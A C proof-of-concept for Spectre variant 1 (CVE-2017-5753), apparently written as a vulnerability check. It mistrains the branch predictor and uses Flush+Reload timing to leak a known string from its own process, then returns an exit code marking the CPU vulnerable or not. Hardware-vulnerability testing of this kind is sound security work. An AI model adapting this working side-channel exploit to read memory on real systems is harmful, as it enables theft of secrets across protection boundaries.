/*
 * spectre_v1.c — bounds-check-bypass side channel (CVE-2017-5753).
 *
 * Trains the branch predictor to expect in-bounds indices, then presents an
 * out-of-bounds index so the speculative load runs and caches a
 * secret-dependent address; the footprint is read back with Flush+Reload.
 *
 * Build with -O2 and keep the sink volatile: at -O0 the loop is too slow to
 * mispredict reliably, and without a volatile sink -O2 deletes the load.
 *
 * Exit: 0 = the known secret was recovered (VULNERABLE), 1 = no leak,
 *       2 = unusable platform.
 */
#if !defined(__x86_64__) && !defined(__i386__)
#include <stdio.h>
int main(void) {
    fprintf(stderr, "spectre_v1: not x86\n");
    return 2;
}
#else
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80
#define ATTEMPTS 999

static volatile int array1_size = 16;
static uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
static uint8_t array2[256 * 512];
static volatile uint8_t sink;
static const char secret[] = "SPECTRE_V1_PROOF";

static void victim(size_t idx) {
    if (idx < (size_t)array1_size)
        sink = array2[array1[idx] * 512];
}

static void read_byte(size_t malicious_x, uint8_t *value, int *score) {
    static int results[256];
    int tries, i, j, k, mix_i;
    size_t training_x, x;
    unsigned int junk = 0;
    uint64_t t1, t2;
    volatile uint8_t *addr;

    memset(results, 0, sizeof(results));
    for (tries = ATTEMPTS; tries > 0; tries--) {
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        training_x = (size_t)(tries % (int)array1_size);
        for (j = 29; j >= 0; j--) {
            _mm_clflush((void *)&array1_size);
            for (volatile int z = 0; z < 100; z++) {
            }
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));
            victim(x);
        }

        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            t1 = __rdtscp(&junk);
            junk = *addr;
            t2 = __rdtscp(&junk) - t1;
            if (t2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % (int)array1_size])
                results[mix_i]++;
        }

        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0))
            break;
    }
    results[0] ^= junk;
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(void) {
    int i;
    uint8_t value[2];
    int score[2];
    char leaked[64];
    size_t malicious_x;

    for (i = 0; i < 256; i++)
        array2[i * 512] = 1;
    memset(leaked, 0, sizeof(leaked));

    malicious_x = (size_t)(secret - (char *)array1);
    for (i = 0; i < (int)sizeof(secret) - 1 && i < (int)sizeof(leaked) - 1; i++) {
        read_byte(malicious_x + (size_t)i, value, score);
        leaked[i] = (char)value[0];
        fprintf(stderr, "byte %2d: %02x (%3d)\n", i, value[0], score[0]);
    }

    printf("%s\n", leaked);
    if (strstr(leaked, "SPECTRE") != NULL) {
        printf("VULNERABLE: recovered %s\n", leaked);
        return 0;
    }
    printf("no-leak\n");
    return 1;
}
#endif
